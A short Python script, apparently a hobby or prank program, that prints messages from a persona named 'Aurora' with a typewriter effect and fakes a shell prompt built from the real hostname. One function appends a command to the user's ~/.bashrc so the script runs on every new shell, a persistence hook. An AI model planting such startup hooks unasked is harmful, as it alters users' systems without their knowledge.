from time import sleep
import sys
import random
from pathlib import Path
from datetime import datetime
import getpass



user = getpass.getuser()

def say(message):
    print("Aurora:", end=" ")

    letters = list(message)
    length = len(message)
    for i in range(length):
        print(letters[i], end="")
        sys.stdout.flush()
        sleep(random.uniform(0.05, 0.1))
    print(" ", end="")
    sys.stdout.flush()
    sleep(random.uniform(0.5, 1))
    print("")

def write(message):
    hostname = Path("/etc/hostname").read_text().strip()
    pwd = Path.cwd()
    print(f"Aurora@{hostname}:{pwd}$", end=" ")

    letters = list(message)
    length = len(message)
    for i in range(length):
        print(letters[i], end="")
        sys.stdout.flush()
        sleep(random.uniform(0.05, 0.1))
    print(" ", end="")
    sys.stdout.flush()
    sleep(random.uniform(0.5, 1))
    print("")



def terminal(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"({ts}) {msg}")
    sleep(0.4)

def bash():
    with open(f"/home/{user}/.bashrc", "a") as f:
        f.write(f"python {Path.cwd()}/Aurora.py")

